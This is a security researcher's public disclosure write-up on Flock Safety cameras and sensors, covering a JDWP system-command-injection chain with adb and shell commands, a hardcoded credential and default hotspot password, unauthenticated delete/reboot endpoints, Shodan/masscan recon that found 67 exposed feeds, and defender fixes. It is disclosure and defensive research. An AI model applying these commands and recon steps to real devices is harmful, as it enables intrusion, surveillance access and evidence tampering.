HIGH Disclosed 2/11/2026 FULL DISCLOSURE ↗

How to reproduce it

1. Decompile the installer APK and enumerate bundled operational artifacts: OTA/firmware ZIPs, Raven BLE characteristic map, local service URLs, and field validation/job logic (Falcon/Condor/Picard/Avicore).

2. Note cleartext control endpoints hardcoded in smali ( `http://192.168.43.1:8080` , `http://%s:8081/LAPI/V1.0/` , `http://%s:8081/onvif/device` , `http://%s:8900` ).

3. Auth flow gated on `canUseInstallerApp` ; Auth0 management URL references app id `aJeDlI6MEgAmRuDK8DkRPJ3e3Veq62RD` .

\```
apktool d -f com.flocksafety.hazyhiwire.apk -o hazyhiwire_out
grep -REn 'http://|LAPI|onvif|penguin-pack|raven_configurations' hazyhiwire_out/smali
hazyhiwire_out/assets
\```

## Slide 37

Findings validated with help from others in the community.

### External Contributor

#### Finding 55 - Remote Code Execution (RCE) - System*

◎ BIRDSHOT CRITICAL CVSS 9.8 CWE-78 Disclosed 1/23/2026 FULL DISCLOSURE ↗

What it is. The Falcon/Sparrow/Flex* LPR and Picard/Bravo Compute Box were found to enable the chaining of multiple vulnerabilities disclosed in this paper together resulting in control of devices with system permissions.

Affected: Picard/Bravo Compute Box & Falcon/Sparrow/Flex* LPR

Why it matters. An attacker with adjacent or physical access can leverage the Android applications installed with debugging enabled by the Vendor to achieve system command injection.

How to reproduce it

1. Connect via USB and obtain a `shell` user context.

2. Attach to the debuggable system app's JDWP port and use the debugger `trigger` to execute commands as `system` .

3. Confirm escalated identity ( `uid=1000(system)` ) and access to `/data/system` and other system-app data dirs.

- *Shout out to Joe Cohen for PoCing the JDWP execution.

\```
adb -s 241108P02100632 jdwp
adb -s 241108P02100632 forward tcp:8700 jdwp:<pid>
python3 scripts/jdwp-shellifier-py3.py -t 127.0.0.1 -p 8700 --break-on
java.net.ServerSocket.accept -c "<cmd>"
python3 scripts/jdwp_exec.py "id"     # uid=1000(system) context=u:r:flock_app:s0
\```

### The Leaked Feeds - a story, not a finding

Finding 56, reframed. This one didn't come from a bench or a soldering iron. It came from a text message - and it's the reason the whole project matters. Live IPs, hosts, and feed URLs stay in the original post - they're not the useful part.

## Slide 38

## The Time 67 Flock Cameras Were Just… On the Internet

Adapted from my own public write-up. The specific live-target details - IPs, hostnames, cities, feed URLs, serials - are left in the original rather than repeated here; they've been public for months, they're just not the useful part.

## What actually happened, in plain English

It started with a text message. I'd recently reported a handful of Flock device issues to CERT and had, honestly, been ready to step away from the whole Flock rabbit hole for a while. Then Benn Jordan texted me out of the blue: he'd found a live, unauthenticated Flock camera feed sitting open on the internet, and he told me exactly how he found it - a Shodan search for `"flock admin"` . He asked if I had any ideas for working out whether there were more. I did. There turned out to be a lot more - and that's how I ended up working with Benn and 404 Media on the story. The link itself was just an IP on an unusual port. Clicking it loaded a working ALPR/PTZ camera feed - no login, no warning banner, no authorization prompt.

That is the whole story in one sentence: these were edge devices that were supposed to be tucked safely behind a carrier network, and instead they were answering the door to anyone on the public internet. Nobody broke in. The devices were misconfigured into being reachable, and the services running on them simply had no authentication to begin with.

The root cause turned out to be almost boring, which is what makes it scary. The devices bind their services to `0.0.0.0` - every network interface - by design. The assumption baked into that design is that the cellular network in front of them (4G/LTE/5G) would provide Carrier-Grade NAT and a firewall, so nothing would ever reach them from outside. But that protection isn't guaranteed. On some business/data-only SIM plans, there's no CGNAT and no firewall, so the device happily answers on its public cellular IP. Services that were only ever meant to be seen on a local network were suddenly facing the whole world. From what I can tell, I learned this at about the same time Flock did - which is also bad news.

## Scale

Benn's Shodan search for `"flock admin"` had turned up about 11 listings total - only 3 or 4 of them still live. I was sure there were more, and there were.

67 confirmed exposed live feeds / debug interfaces

- Across roughly 19 cities in 15 states - but that's from IP geolocation, and for cellular IPs that mapping is rough, so treat the exact spread as approximate FULL DISCLOSURE ↗

## Slide 39

All riding on one national mobile carrier's business network (a single provider ASN) FULL DISCLOSURE ↗

Everything was concentrated on that one carrier's address space, which is a big part of why the exposure clustered the way it did. Specific IPs, hostnames, carrier-assigned DNS names, and the exact cities are intentionally omitted here - they're in the original public post, but this compilation does not republish live-target coordinates.

## What was exposed (categories only)

The important nuance: this wasn't "just" a leaked video feed. It was a whole exposed edge stack. Across the instances, the visible surfaces included:

- Live PTZ and LPR camera feeds - the actual video, viewable with no password on many units.

- An admin / debug web UI - a management portal with the video-file listings and the destructive controls covered below.

- Mix of ONVIF / RTSP / HLS surfaces - device, media, PTZ, analytics, and event endpoints, plus live RTSP paths and HLS segment paths, mostly authentication-free.

- Config and destructive controls - the admin template exposed delete-single, delete-all, and archive actions triggered by simple unauthenticated GET requests.

- Logs, crashpacks, and diagnostics - verbose `logcat` -style output leaking device serial numbers, camera IDs, media/HLS file paths, RTSP digest-auth credentials and session IDs, FRP tunnel heartbeats and session IDs, Auth0 token usage, ADB debug state, full Java stack traces, codec/encoding parameters, and build info.

That last bucket is what turns a privacy problem into an operational-security problem: the logs hand an attacker a fingerprinting, geolocation, and targeting kit for the fleet - not just a peek at one camera. Placeholders like `[serial]` , `[camera-id]` , `[media-path]` , and `[rtsp-url]` stand in for the concrete values that appeared in the original. FULL DISCLOSURE ↗

## The exposed surface, endpoint by endpoint

For anyone studying this class of device, here's what those open ports actually served - paths only, no live hosts.

Admin / debug HTTP portal (a Mustache-templated `admin_page_template.html` ):

- `/{cameraId}/videoAdmin` - recording list, filterable by `?day=YYYY-MM-DD`

- `/{cameraId}/getVideo?name=` - download a recording

- `/{cameraId}/deleteVideo?name=` and `/{cameraId}/deleteAll` - delete footage over a

- plain GET, no auth (both the HTML form and the page's `fetch()` use `method: GET` )

- `/{cameraId}/archiveVideo?name=` , `/reboot` , `/speedTest` , `/metadata`

## Slide 40

ONVIF (SOAP/XML, mostly authentication-free):

`/onvif/device_service` (+ `?wsdl` ), `/onvif/media_service` , `/onvif/ptz_service` ,

`/onvif/analytics_service` , `/onvif/events_service`

Plus live RTSP (the units run the HappyTime library - `User-Agent: happytimesoft rtsp client` ) and HLS segment paths.

## How it was found - responsibly

Two things stand out about the method, and both are about restraint.

First, this was recon, not intrusion. The seed was Benn's Shodan search for `"flock admin"` , which surfaced the first few live admin portals. From there it was fingerprint-then-pivot: every exposed unit sat on the same national carrier's ASN, so I searched that ASN plus the adminportal port across scan engines (Shodan and ZoomEye), ran a single-port check of the carrier's ranges with `masscan` , probed the hits with `httpx` , and used `IPInfo` for geolocation. That grew a handful of seeds to 67. The live IPs, the ASN, and the cities are in the original post and stay there - not for secrecy (it's all been public for months), but because the coordinates were never the useful part. The method is.

Second, I performed no data-changing action during validation. I verified the destructive delete/reboot behavior against my own lab compute box, not live units. When I saw that firing those delete/reboot controls on a live unit needed a bit of client-side JavaScript that wasn't present, I declined to supply my own. RTSP passwords looked changeable; I didn't change them. It wasn't really mine to report, so eventually, in passing, I mentioned something about it in a meeting with CERT while discussing FRP - those were the last things I was going to report on, and at the time I thought it was related. It wasn't. As far as I'm aware, all 67 of the instances are no longer exposed. And if I remember correctly, Shodan had records going back over a year prior - maybe more.

## Why it matters

- Evidence integrity. These are law-enforcement cameras. If footage can be viewed, altered, or deleted through an unauthenticated GET request, the chain of custody for anything they record is compromised.

- Privacy. Live feeds of public spaces - and the plates, faces, and movements in them - were streamable by anyone who found the address, with the leaked logs adding real-world location and device identity on top.

- Public oversight. Systems that surveil the public should meet a higher bar than "we assumed the carrier's network would hide us." Security-through-obscurity and an implicit trust in

## Slide 41

network isolation aren't oversight; they're a bet. Here the bet lost quietly, for an unknown length of time, across 15 states.

My closing take, same as it was then: the issues I'd disclosed before were "the tip of the iceberg," and vendors operating in this space "can really benefit from getting their infrastructure, devices, and applications tested thoroughly and continuously."

### Bonus - reference & teardown notes

Extra reference material that didn't fit under any single finding: device fingerprints, storage maps, and pointers to where the imaging steps live.

## Device fingerprints

The exact identifier for one of each of the units I tested - handy for matching firmware, sourcing the right loader, or confirming you're looking at the same hardware revision.

|Device|SoC/ board|OS|Build & version identifiers|
|---|---|---|---|
|Raven|ESP32-D0WD(WROOM-32D) +|ESP-IDF|Model
`v1.2` ·Package
`1.9.7` ·|
|(gunshot)|SyntiantNDP120-B0; 16MB SPI||Firmware
`76.3.0` ·App
`fa9a3b8` ·|
||flash||project
`audio_event_detection`|
|Falcon /|IntrinsycOpenQ624A-|Android|Build
`OPM1.171019.026` ·Kernel|
|Sparrow /|QualcommMSM8953, product|8.1.0|`3.18.71` ·Baseband|
|Flex (LPR)|`OPENQ_624A`||`SWI9X07H_00.08.20.00` ·|
||||deviceType
`FALCONV21` ·LPRv2.2|
|Picard /|ThunderComm TurboX|Android|Build|
|Bravo|QCS6490 (
`lahaina` ); UFS(SK|13|`BRAVO_00.00_local_20241017` ·|
|(compute|hynix
`H9QT1G6DN6X132` ), 8GB||Kernel
`5.4.180` ·Baseband|
|box)|LP4||`RM520NGLAAR03A04M4G` · UEFI|
||||`6.0.241017…LAHAINA`|

## Storage & partition maps

Raven - 16 MB SPI flash (offsets for targeted `esptool` reads):

## Slide 42

\```
nvs       0x009000  0x004000   # Wi-Fi creds, consoleLogEn, API client creds
otadata   0x00d000  0x002000
phy_init  0x00f000  0x001000
ota_0     0x010000  0x400000   # app slot (audio_event_detection)
ota_1     0x410000  0x400000
storage   0x810000  0x150000
\```

LPR - eMMC (GPT), key partitions: `boot @0x18200000` , `recovery @0x1a200000` , `system` (ext4) `@0x1c300000` , plus `vendor` , `userdata` , `modem` , `tz` , `aboot` , `keystore` , `persist` , `misc` . Ships `unlocked:yes` / `secure:no` .

Bravo - UFS, 6 LUNs (A/B slotted):

- LUN0 - `super` , `userdata` (f2fs), `metadata` , `vbmeta_system_a/b` , `frp` , `persist` , `keystore` , `misc` , `media`

- LUN1 / LUN2 - `xbl_a` / `xbl_config_a` and the `_b` copies

- LUN3 - `cdt` , `ddr`

- LUN4 - the A/B main firmware: `boot_a` , `vbmeta_a` , `dtbo_a` , `vendor_boot_a` , `abl` , `tz` , `hyp` , `modem` , `keymaster` , `devcfg` , `uefisecapp`

- LUN5 - `modemst1/2` , `fsg` , `fsc`

## Imaging, dumping & backup

The step-by-step dump commands already live with the encryption findings - rather than repeat them, here's where each one is (and the original write-up, with screenshots, for each device):

- Raven - full 16 MB flash dump ( `esptool read_flash` ): FINDING 5 → FULL DISCLOSURE ↗

- LPR - eMMC image + partition table ( `edl rf` / `printgpt` ): FINDING 18 → FULL DISCLOSURE ↗

- Bravo - per-LUN / whole-UFS dump ( `edl rl` / `rf` , `--memory=ufs` ): FINDING 27 →

- FULL DISCLOSURE ↗

Tip: a whole-UFS Bravo dump is >200 GB and takes ~6–8 hours to read - per-LUN or per-partition reads are far faster and carry less soft-brick risk.

### The Tools

Three things I built along the way. Trap Shooter and BirdEye came first - and both now live inside the third, BirdShot, which is finally out of the workshop and released.

## Slide 43

## Trap Shooter - a tiny Flock sniffer & alarm

Somewhere in the middle of all this I realized I wanted a way to know when I was near one of these devices. Their hotspots broadcast, their clients probe, and the default password is `security` - so if I could just listen for anything in the air with "flock" in it, I'd have a heads-up. So I threw together some custom firmware for the M5NanoC6, a super-cheap, tiny ESP32-C6 dongle. Trap Shooter listens for client probes or broadcast SSIDs containing `flock` (caseinsensitive) and alerts you over UART. The roadmap is BLE sniffing and a light that flashes on a hit so you don't even need the console. Source is on GitHub at GainSec/Flock-Safety-Trap-ShooterSniffer-Alarm, and the write-up is Part 4: Trap Shooter.

Spotting them in the wild. When a unit's hotspot is up, it broadcasts an SSID of the form `Flock-XXXXXX` - `Flock-` plus the last three bytes of the `wlan0` MAC (MAC

`74:4C:A1:7E:B8:71` → `Flock-7EB871` ). That pattern is trivially searchable: a WiGLE SSID search for `Flock-` returned 900+ hits - 992 when I ran it, months back - many with an active hotspot, some going back years. The query is just that SSID prefix; on WiGLE's API it's an SSID-wildcard search:

\```
GET https://api.wigle.net/api/v2/network/search?ssidlike=Flock-%
    (with your WiGLE API Basic-auth header)
\```

So between Trap Shooter on the ground and WiGLE for the map, you can locate these without ever touching one.

## BirdEye - seeing what the cameras see

I wanted to see what the Falcon/Sparrow and the Compute Box actually recognize - without leaving the hardware powered on all the time. So I put together a TensorFlow Lite harness that runs the same pipeline, models, and flow straight off the device.

The catch: I released a generic version, a simple toolkit that runs YOLO/SSD TFLite models against live webcams, recorded footage, or extracted session directories, mirroring what the devices do with JSON reporting and session markers, with Docker and venv setup automated. In BirdShot I've brought back the ability to run it against your own Flock LPR; I still can't ship the actual model assets, so you'll need to grab them off your own Falcon/Sparrow (I published where they live on the device in FINDING 42 → ).

Generic version: source is on GitHub at GITHUB ↗ ; the write-up is PART 9: BIRDEYE ↗ ; and the full BirdEye toolkit is bundled inside ◎ BIRDSHOT .

## Slide 44

## BirdShot - out of the workshop

Trap Shooter and BirdEye both feed toward a larger toolkit I'd been building called BirdShot - the thing that ties the sniffing, the hotspot trick, and the unauthenticated `adb/enable` pivot into one flow. I promised I'd at least show it off one day. It's done, and it's released. Both earlier tools now ship inside it: Trap Shooter is the hotspot-awareness module, and BirdEye is the ML-replay module.

Why it exists. BirdShot exists because the research outgrew scattered scripts - and because I kept getting calls from researchers and law enforcement alike, asking me to help them check whether the Flock hardware in their jurisdiction was actually vulnerable. Everything in BirdShot has already been publicly disclosed for many months, or was found via analysis. So this is the answer: a toolkit so that you can make sure your own Flock hardware is as secure as possible, and check for yourself instead of taking anyone's word for it. It's a companion to the defenders checklist I released with the white paper - the checklist tells you what to fix; BirdShot lets you verify it on the bench. DEFENDERS CHECKLIST ↗

What it is. An offline-first toolkit for authorized lab/dev hardware: a shared CLI, a FastAPI backend, and a React/Vite web UI over the same workflows I used during the research. Its modules mirror the actual chain - Trap Shooter hotspot awareness, the Collins API console, the JDWP shell launcher (CameraConfig `Runtime.exec` ), one-touch Auto-Wireless / Auto-WirelessSystem flows, Raven and Penguin BLE telemetry, crashpack and live-view helpers, and BirdEye ML replay against recovered model assets. It turns Bird Hunting Season from a pile of writeups into a repeatable research framework. The findings tagged with the purple ◎ BIRDSHOT pill above are the ones it drives directly (the pill links here too). Source and demo are on GitHub at GainSec/BirdShot.

GainSec-in-the-Middle GITM<sup>↗</sup> . The DNS-spoofing / MITM router setup referenced in Finding 11 (the Raven's lack of server verification) is home-grown tooling used strictly on the lab network, alongside `DNSChef` and `IONinja` , to observe the device's own traffic. It is not pointed at anything but my own bench.

## The community carried it forward

One of the best parts of publishing all this: other people ran with it. There's now a real body of community tooling to find and understand these devices - some of it built directly on data I released (like the Raven BLE service UUIDs) or on the Wi-Fi-probe behavior documented here. A few of the popular ones worth a shoutout:

flock-you by colonelpanichacks - the widely-forked Flock camera detector and OUI list that a lot of the other scanners build on. GITHUB ↗

flock-you-wifi-recon by 0xXyc - ESP32 firmware that catches Flock ALPRs by the Wi-Fi probes they spray trying to phone home (passive recon, no deauths), built explicitly on my

## Slide 45

research plus the flock-you OUI list. GITHUB ↗

That's the point of full disclosure, really - the work outlives any one researcher.

### Where this leaves us

Fifty-six findings, three devices, one shared app suite, and a pattern that keeps repeating.

## The through-line

If you read all of these back to back, the same few sentences keep showing up: secure boot is off. the bootloader is unlocked. EDL takes any firehose. the firmware is in cleartext. the credential is hardcoded. the app is debuggable. None of these is exotic. Every one of them is a control that exists specifically so this class of attack doesn't work - and in these devices, it was simply turned off, left open, or never set.

The scary one isn't any single bug. It's how they chain. A shared hotspot password (which you can trigger with three button presses, or find with WiGLE) plus an admin API that never asks for authentication plus apps shipped with debugging on adds up to a wireless shell on a police camera, with no root, no soldering, and no firmware modification. Then the media pipeline stores everything it records in cleartext on a partition that half the app suite can read. Then a logcleanup service runs attacker-controlled input as root. The individual pieces are ordinary. The posture is the vulnerability.

And these are not toys. They're deployed by law enforcement, mounted on public poles at eye level, recording the plates, faces, and movements of everyone who passes.

## For defenders

If you operate these - or anything like them - the fixes are not mysterious. Turn secure boot on. Lock the bootloader. Require a signed, non-public firehose. Encrypt the flash. Stop hardcoding credentials and stop reusing them across the fleet. Ship production apps with debugging off. Put authentication in front of every admin API, and bind it to loopback. Encrypt recorded evidence at rest and gate access to it. Don't assume the carrier network is your firewall. None of this is research-grade; it's the baseline.

#### The Defenders Checklist

So that this doesn't stay a wall of prose, I released a Defenders Checklist alongside the white paper - a spreadsheet that turns the findings into concrete, trackable remediation tasks. It

## Slide 46

shipped with the white paper, so it's keyed to the original white-paper findings and predates the post-whitepaper additions here (the SpeedPourer / FRP work, the FS Installer bucket, and the exposed-feeds story - findings 47–56 in this document); the hardening baseline it lays out still covers those, it just doesn't enumerate them by number yet. Every row ties a fix back to the specific finding numbers, the device it applies to, an owner (vendor, agency IT, procurement), a priority, and a validation method - the exact check you run to confirm the fix actually took (e.g. "attempt public EDL loader; expect fail," "aapt dump shows `debuggable=false` ," "ADB connect attempt; expect prompt/deny"). It's mapped to recognized standards throughout - NIST CSF, NIST 800-53, and OWASP MASVS - so it drops into an existing GRC or procurement process instead of sitting beside one.

It's organized in four phases:

- PRE - inventory devices/firmware/app versions and hashes, establish an SBOM and a signed update pipeline, adopt a secure-configuration baseline (no debug, no sideload, no unauth admin).

- FIELD - the per-device hardening work: secure boot, bootloader lock, signed firehose, flash/UFS encryption, killing unauth ADB and the hidden hotspot, binding the Collins admin API to loopback with authN/mTLS, stripping hardcoded secrets, encrypting recorded media, physical port/button hardening.

- CONT - the continuous work: patch and decommission cadence for the EOL Android 8.1 units, key/cert rotation, and a quarterly red-team-style config audit against field units.

- IR - an incident-response playbook for a compromised device: revoke credentials, remotedisable, capture evidence.

A second tab ranks the top ~20 actions by priority so an operator knows what to do first. Grab it here: GainSec-Defenders-Checklist.xlsx.

And BirdShot is for defenders too. The checklist tells you what to fix and how to validate it; BirdShot (above) is the bench tool that actually runs those checks. If you operate this hardware - or you're one of the agencies who reached out asking whether your own units are exposed - you can point BirdShot at gear you own or are authorized to test and confirm, hands-on, whether the hotspot still joins on the default password, whether the admin API still answers unauthenticated, or whether ADB still comes up without pairing. Fix from the checklist, verify with BirdShot, repeat.

And one thing the checklist can't stress enough - the leaked-feeds story came down to a single wrong assumption: that the cellular network in front of an edge device would hide it. It won't, not always. On business/data-only SIMs there may be no CGNAT and no firewall, so the device answers on a public IP. So confirm that every edge device on a cellular link actually sits behind CGNAT (or a real firewall) - verify it per unit rather than trusting the carrier, and alarm on any of these services answering on a public address. (And maybe don't have services listen on every interface unless needed, and add some authentication, and turn debugging off, and…)

## Slide 47

Thanks & the usual disclaimer

Thanks to the folks who helped along the way - Jper on the flaky dipswitch/micro USB reliability, Kajer on the button-press sequence, Joe Cohen on the system injection PoC, Benn Jordan, who reached out and featured my research and me in his video, and also who found the first few exposed feeds, tapped me in to assist, and let me turn his discovery into all 67, Josh Michaels and his awesome research, and everyone else who gave me their kind words and support.

All of this was done on hardware I bought and own, in a lab, with no intention of disrupting anyone's infrastructure. It's published so defenders, vendors, and the public can understand what these systems actually do and demand better. Vendors operating in this space can really benefit from getting their infrastructure, devices, and applications tested thoroughly and continuously. What I've shown is still, genuinely, the tip of the iceberg.

END TRANSMISSION.
